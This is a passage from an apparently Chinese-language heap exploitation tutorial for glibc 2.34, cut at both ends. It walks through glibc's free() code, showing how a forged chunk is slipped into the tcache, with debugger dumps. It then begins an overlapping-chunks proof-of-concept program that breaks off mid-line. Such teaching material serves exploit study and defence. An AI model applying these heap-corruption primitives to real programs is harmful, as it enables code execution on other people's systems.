class="string">"free(): invalid pointer"</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it's not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache_key))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    <span class="keyword">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = REVEAL_PTR (tmp-&gt;next), ++cnt)</span><br><span class="line">	      &#123;</span><br><span class="line">		<span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">		  malloc_printerr (<span class="string">"free(): too many chunks detected in tcache"</span>);</span><br><span class="line">		<span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp)))</span><br><span class="line">		  malloc_printerr (<span class="string">"free(): unaligned chunk detected in tcache 2"</span>);</span><br><span class="line">		<span class="keyword">if</span> (tmp == e)</span><br><span class="line">		  malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">		<span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">		   few cycles, but don't abort.  */</span></span><br><span class="line">	      &#125;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_put (p, tc_idx);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line">#<span class="keyword">if</span> TRIM_FASTBINS</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	If TRIM_FASTBINS set, don't place chunks</span></span><br><span class="line"><span class="comment">	bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">			  &lt;= CHUNK_HDR_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">			     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="keyword">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line">	<span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">	   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">	   getting the lock.  */</span></span><br><span class="line">	<span class="keyword">if</span> (!have_lock)</span><br><span class="line">	  &#123;</span><br><span class="line">	    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">	    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= CHUNK_HDR_SZ</span><br><span class="line">		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">	    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fail)</span><br><span class="line">	  malloc_printerr (<span class="string">"free(): invalid next size (fast)"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line"></span><br><span class="line">    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">	   add (i.e., double free).  */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  malloc_printerr (<span class="string">"double free or corruption (fasttop)"</span>);</span><br><span class="line">	p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">	*fb = p;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">	     add (i.e., double free).  */</span></span><br><span class="line">	  <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	    malloc_printerr (<span class="string">"double free or corruption (fasttop)"</span>);</span><br><span class="line">	  old2 = old;</span><br><span class="line">	  p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">	     != old2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       allocated again.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">	&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">"invalid fastbin entry (free)"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we're single-threaded, don't lock the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      have_lock = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_lock (av-&gt;mutex);</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      malloc_printerr (<span class="string">"double free or corruption (top)"</span>);</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">			  &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">			  &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">	malloc_printerr (<span class="string">"double free or corruption (out)"</span>);</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      malloc_printerr (<span class="string">"double free or corruption (!prev)"</span>);</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= CHUNK_HDR_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">"free(): invalid next size (normal)"</span>);</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">	unlink_chunk (av, nextchunk);</span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">	not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">	been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">	malloc_printerr (<span class="string">"free(): corrupted unsorted chunks"</span>);</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don't know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don't want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">	malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">	    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">	  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">	   large, because the corresponding heap might go away.  */</span></span><br><span class="line">	heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">	assert(heap-&gt;ar_ptr == av);</span><br><span class="line">	heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们用到的：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  <span class="comment">//获取p的大小</span></span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//获取索引，该放到哪个tcache bin链表中</span></span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="comment">//如果tcache bin链表不为null，而且索引小于最大索引</span></span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it's not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">	<span class="comment">//如果chunk的key等于tcache_key，就有可能是已经在bin链表中了，也有可能是碰巧相等（概率极低）。所以继续检查其他内容，看是否真的已经在tcache bin中。</span></span><br><span class="line">	<span class="comment">//这里，由于我们并没有进行第一次malloc，所以没有初始化tcache_key，所以e-&gt;key == tcache_key == 0，会进入到后续检查。</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache_key))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    <span class="keyword">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = REVEAL_PTR (tmp-&gt;next), ++cnt)</span><br><span class="line">	      &#123;</span><br><span class="line">		<span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">		  malloc_printerr (<span class="string">"free(): too many chunks detected in tcache"</span>);</span><br><span class="line">		<span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp)))</span><br><span class="line">		  malloc_printerr (<span class="string">"free(): unaligned chunk detected in tcache 2"</span>);</span><br><span class="line">		<span class="keyword">if</span> (tmp == e)</span><br><span class="line">		  malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">		<span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">		   few cycles, but don't abort.  */</span></span><br><span class="line">	      &#125;</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="comment">//检查完了发现没在Bin中</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//如果counts数组的值小于能存储的最大chunk数量，即该bin没有存满7个chunk</span></span><br><span class="line">	<span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">	  &#123;</span><br><span class="line">	    <span class="comment">//p放到对应索引的bin中</span></span><br><span class="line">	    tcache_put (p, tc_idx);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p>
<p><code>tcache_put()</code>函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line">  <span class="comment">//e-&gt;next指针在2.34中不是直接存储了，而是经过了位移异或。这个将会在后面的文章中详细介绍，这里先略过。</span></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  <span class="comment">//counts计数数组+1</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里执行完之后，就完成了fake_chunk进入tcache bin。<br>然后再次申请0x30的内存，就会首先从tcache中选取。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> x/4gx p</span><br><span class="line">0x7fffffffdab0: 0x00000007fffffffd      0x0000000000000000</span><br><span class="line">0x7fffffffdac0: 0x00007ffff7dcd000      0xb48ee8d225b73400</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/4gx b</span><br><span class="line">0x7fffffffdab0: 0x00000007fffffffd      0x0000000000000000</span><br><span class="line">0x7fffffffdac0: 0x00007ffff7dcd000      0xb48ee8d225b73400</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/8gx fake_chunk</span><br><span class="line">0x7fffffffdaa0: 0x0000000000000000      0x0000000000000040</span><br><span class="line">0x7fffffffdab0: 0x00000007fffffffd      0x0000000000000000</span><br><span class="line">0x7fffffffdac0: 0x00007ffff7dcd000      0xb48ee8d225b73400</span><br><span class="line">0x7fffffffdad0: 0x00007fffffffdbe8      0x00007ffff7a091b3</span><br></pre></td></tr></table></figure>
<p>b就获得了伪造的chunk内容。<br>伪造的chunk可以写system地址，或者放更多的shellcode加以利用。</p>
<h2 id="overlapping-chunks-glibc2-34"><a href="#overlapping-chunks-glibc2-34" class="headerlink" title="overlapping chunks glibc2.34"></a>overlapping chunks glibc2.34</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>通过修改chunk头部中的chunk_size部分，来“合并”两个chunk。 如果free后再次申请一个chunk，而size又在chunk_size所在tcache bin idx中，malloc就会从tcache中取出“合并”好的chunk。</p>
<h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">long</span> *p1,*p2,*p3,*p4;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nThis is another simple chunks overlapping problem\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The previous technique is killed by patch: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c\n"</span></span><br><span class="line">		   <span class="string">"which ensures the next chunk of an unsortedbin must have prev_inuse bit unset\n"</span></span><br><span class="line">		   <span class="string">"and the prev_size of it must match the unsortedbin's size\n"</span></span><br><span class="line">		   <span class="string">"This new poc uses the same primitive as the previous one. Theoretically speaking, they are the same powerful.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Let's start to allocate 4 chunks on the heap\n"</span>);</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n"</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="string">'1'</span>, <span class="number">0x80</span> - <span 